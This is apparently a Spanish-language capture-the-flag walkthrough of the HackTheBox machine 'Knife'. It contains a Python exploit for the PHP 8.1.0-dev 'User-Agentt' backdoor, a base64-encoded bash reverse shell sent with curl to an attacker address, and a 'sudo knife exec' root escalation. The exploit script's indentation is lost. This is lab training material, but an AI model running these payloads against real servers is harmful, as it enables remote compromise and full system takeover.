# Knife

![](../../../../~gitbook/image.md)Publicado: 13 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
La máquina "Knife" es un sistema Linux vulnerable que ejecuta un servidor web Apache con PHP 8.1.0-dev. Esta versión específica de PHP contiene un backdoor que permite la ejecución remota de comandos mediante la manipulación de la cabecera HTTP "User-Agentt". La explotación inicial permite obtener acceso como el usuario "james", quien tiene privilegios para ejecutar el binario "knife" como root sin contraseña, lo que permite una fácil escalada de privilegios al sistema.
### 🚀 Metodología

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP (Apache httpd 2.4.41)
![](../../../../~gitbook/image.md)Tras enumerar la página, no se ve a priori gran cosa que se pueda hacer en ella.🕷️Fuzzing de directoriosTras probar a realizar fuzzing de directorios con gobuster y feroxbuster tampoco logramos añadir ningún nuevo recurso a nuestro scope:
#### Enumerando tecnologías con wappalyzer
Al enumerar las tecnologías empleadas en el sitio web, sí que llama algo la atención, la versión de PHP que está usando el sitio web podría backdorizable:![](../../../../~gitbook/image.md)
### 💻 Explotación (Opción A usando exploit)
Una versión temprana de PHP, la versión PHP 8.1.0-dev fue lanzada con una puerta trasera el 28 de marzo de 2021, pero la puerta trasera fue rápidamente descubierta y eliminada. Si esta versión de PHP se ejecuta en un servidor, un atacante puede ejecutar código arbitrario mediante el envío de la cabecera User-Agentt.
El siguiente exploit utiliza el backdoor para proporcionar un pseudo shell ont el host.
Y existen algunos exploits para esta vulnerabilidad:https://www.exploit-db.com/exploits/49933A continuación lo ejecutamos de la siguiente forma para obtener una shell interactiva con el host remoto:Un mensaje de error no indica que no se ha podido cargar la tty por lo que tenemos una consola un poco limitada.
### 💻 Explotación (Opción B usando reverse shell y curl)
Generamos una bash reverse shell que codificaremos en base64Posteriormente, dado que problema de esta versión es que se publicó con una puerta trasera (backdoor). Si se pone la cabecera `User-Agentt: zerodiumsystem("codigo reverseshell");` obtendremos acceso remoto al host
#### Mejora de la shell
En nuestro host de ataqueEn el host comprometido
#### 👑 Escalada de privilegios
Verificamos si james puede ejecutar algún binario como root:Encontramos información sobre este binario y las posibles opciones para llevar a cabo la escalada de privilegios debido a una missconfiguration:
https://gtfobins.github.io/gtfobins/knife/![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación (Opción A usando exploit)](#explotacion-opcion-a-usando-exploit)
- [💻 Explotación (Opción B usando reverse shell y curl)](#explotacion-opcion-b-usando-reverse-shell-y-curl)

```
❯ ping -c2 10.10.10.242
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=47.2 ms
64 bytes from 10.10.10.242: icmp_seq=2 ttl=63 time=46.6 ms

--- 10.10.10.242 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1019ms
rtt min/avg/max/mdev = 46.552/46.885/47.218/0.333 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.10.242 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 18:49 CEST
Nmap scan report for 10.10.10.242
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds

```

```
gobuster dir -u http://10.10.10.242 -w /usr/share/seclists/Discovery/Web-Content/common.txt  -b 403,404,502 -x .php, .txt, .xml -r
```

```
feroxbuster -u http://10.10.10.242 -r  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings -C 404
```

```
# !/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '':
print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
try:
while 1:
cmd = input("$ ")
headers = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"User-Agentt": "zerodiumsystem('" + cmd + "');"
}
response = request.get(host, headers = headers, allow_redirects = False)
current_page = response.text
stdout = current_page.split('',1)
text = print(stdout[0])
except KeyboardInterrupt:
print("Exiting...")
exit

else:
print("\r")
print(response)
print("Host is not available, aborting...")
exit
```

```
python3 backexploit.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242
Can't acces tty; job crontol turned off.
$
```

```
echo -n 'bash  -i >& /dev/tcp/10.10.14.7/4444 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNy80NDQ0IDA+JjE=
```

```
nc -nlvp 444
```

```
curl 10.10.10.242 -H 'User-Agentt: zerodiumsystem("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNy80NDQ0IDA+JjE= | base64 -d | bash");'
```

```
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.242] 34250
bash: cannot set terminal process group (947): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

```
script /dev/null -c bash
Crtl +z
(suspended)
stty raw -echo;fg
reset xterm
export TERM=xterm
```

```
stty size
```

```
stty rows X columns Y
```

```
$ sudo -l
Matching Defaults entries for james on knife:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
(root) NOPASSWD: /usr/bin/knife

$
```

```
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
(root) NOPASSWD: /usr/bin/knife
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
033ee***********************
#
```
